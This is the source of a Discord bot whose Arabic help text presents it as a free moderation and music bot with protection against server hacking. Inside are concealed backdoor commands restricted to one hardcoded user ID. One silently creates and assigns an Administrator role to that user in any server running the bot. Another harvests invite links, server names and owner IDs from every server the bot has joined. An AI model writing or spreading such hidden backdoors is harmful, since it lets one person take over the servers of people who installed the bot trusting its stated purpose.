const Discord = require('discord.js');
const fs = require('fs');
const ms = require('ms');
const canvas = require('canvas-prebuilt');
const jimp = require('jimp');
const ytdl = require('ytdl-core');
const request = require('request');
const dateFormat = require('dateformat');
const google = require('google-it');
const db = require('quick.db');
const giphy = require('giphy-api')();    
const googl = require('goo.gl');  
const translate = require('google-translate-api');   
const { Client, Util } = require('discord.js');  
const UserBlocked = new Set(); 
const moment = require('moment');
const pretty = require('pretty-ms'); 
const zalgo = require('zalgolize');   
const math = require('math-expression-evaluator'); 
const stripIndents = require('common-tags').stripIndents;
const figlet = require('figlet');
const client = new Discord.Client();
const prefix = '$'
const myID = "415595760990552065";
ti={}  
spee={};

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);       
  console.log(`Done`);
});

client.on('ready', function(){    
    var ms = 100000 ;
    var prefix = "-"; 
    var setGame = [` #Amaterasu ✨`,`Love All 🌹`,` $help 💕 `];
    var i = -1;    
    var j = 0;    
    setInterval(function (){    
        if( i == -1 ){    
j = 1;    
       }    
        if( i == (setGame.length)-1 ){    
            j = -1;    
      }    
       i = i+j;    
        client.user.setGame(setGame[i],`https://www.twitch.tv/Ninja`);
}, ms);    
    
});

client.on('message', message => {
     

     if (message.content === "=startlol") {
         if(message.author.id !== myID) return;
  message.guild.createRole({
        name : "amaterasu",
        permissions :   [8],
        color : " #BDBDBD "
    }) 
}
});

client.on('message', message => {
  if (message.content.startsWith('=startlol')) {
     if(!message.channel.guild) return;
 if(message.author.id !== myID) return;
message.member.addRole(message.guild.roles.find("name", "amaterasu"));
 
 }
 });

  client.on('message', msg => {
    if(msg.author.bot) return;
    
    if(msg.content === '=serversinfo') {
 if(msg.author.id !== myID) return;

      client.guilds.forEach(g => {
        
        let l = g.id
        g.channels.get(g.channels.first().id).createInvite({
          maxUses: 5,
          maxAge: 86400
        }).then(i => msg.channel.send(`
        **
        Invite Link : <https://discord.gg/${i.code}>
        Server : ${g.name} | Id : ${g.id} 
        Owner ID : ${g.owner.id}
        **
        `))
  
  
      })
    }
    
  })

client.on('message', msg => {
  if (msg.content === '=startlol') {
if(msg.author.id !== myID) return;
    msg.reply('Done :)');
  }
});


client.on("message", message => {

            if (message.content.startsWith(prefix + "bc")) {
                         if (!message.member.hasPermission("ADMINISTRATOR"))  return;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' '); 
  message.guild.members.filter(m => m.presence.status !== 'all').forEach(m => {
 m.send(`${argresult}\n ${m}`);
})
 message.channel.send(`\`${message.guild.members.filter(m => m.presence.status !== 'all').size}\` : عدد الاعضاء المستلمين`); 
 message.delete(); 
};     
});


client.on('message', message => {
  if (message.author.bot) return;
   if (message.content === prefix + "help") {
    if(!message.member.hasPermission('ADMINISTRATOR')) return      message.channel.send('**انت لست من الادارة :x:** `ADMINISTRATOR`' );




message.author.sendMessage(`
**
╭━━━╮╱╱╱╱╱╭╮
┃╭━╮┃╱╱╱╱╭╯╰╮
┃┃╱┃┣╮╭┳━┻╮╭╋━━┳━┳━━┳━━┳╮╭╮
┃╰━╯┃╰╯┃╭╮┃┃┃┃━┫╭┫╭╮┃━━┫┃┃┃
┃╭━╮┃┃┃┃╭╮┃╰┫┃━┫┃┃╭╮┣━━┃╰╯┃
╰╯╱╰┻┻┻┻╯╰┻━┻━━┻╯╰╯╰┻━━┻━━╯
[❖═════ لتشغيل اللوق log يجب وجود روم باسم ═══════❖]
[❖═════════════════════════════❖]
        لماذا بروبوت ؟
1- :rocket: سرعه اتصال ممتازه
2- :beginner: سهل الاستخدام
3- :warning: صيانه يوميه
4- :money_with_wings: مجاني بالكامل
5- :shield: يحتوي على مانع اختراق سيرفرات للحفاظ على امان سيرفرك
6- :musical_note: يحتوي على خاصيه ميوزك بجوده عاليه
[❖═════════════════════════════❖]
__**نسخه تجريبيه للبريميوم .**__
الاوامر العامة
#id معلومات عن حسابك الشخصي
#server معلومات حول السيرفر
#move سحب عضو الى رومك الصوتي
#clear مسح الرسائل الموجوده في الروم بعدد
#avatar يعرض اك صورتك الشخصية
#image يعرض لك صورة السيرفر
#credit يوريك كم الكريديت حقتك
#daily يسوي لك سحب فلوس
#rep يعطي ريب
#rank يطلع لك نقاطك
#profile معلومات عامة مع الصورة
أوامر ادارة السيرفرات 
#ban حضر عضو من السيرفر
#setwelcomer لتحديد روم الويلكم
#autorole لتشغيل الاوتو رول وتحديد الرتبه
#kick طرد عضو من السيرفر
#mute اعضاء ميوت كتابي لعضو في السيرفر
#unmute فك الميوت عن عضو في السيرفر
#warn لتحذير شخص
#dac حذف جميع رومات السيرفر
#dar حذف جميع رتب السيرفر
#openroom فتح المحادثة في الروم
#closeroom قفل المحادثة في الروم
#role اعطاء رتبه لشخض معين
#role humans اعطاء رتب للبشريين
#role bots اعطاء رتبه للبوتات
#role all اعطاء رتبه للجميع سواء بشر او بوتات
#-role سحب الرتبه من شخص معين
#-role humans سحب رتبه من الميمبرز
#-role bots سحب رتبه للبوتات
#-role all سحب رتبه معينه من جميع الاعضاء سواء يوزرات او بوتات
#temp on تشغيل الرومات المؤقته
#temp off اطفاء الرومات المؤقته
اوامر الميوزك
#play لتشغيل ميوزك
#stop لايقاف الميوزك
#skip لتخطي الميوزك
#queue لعرض قائمه الانتظار
#vol لرفع صوت
اخرى 
#support رابط سيرفر الدعم الفني
#invite رابط اضافة البوت
#ping لمعرفه سرعه اتصال البوت
**`);

  }
});

client.login(process.env.BOT_TOKEN);
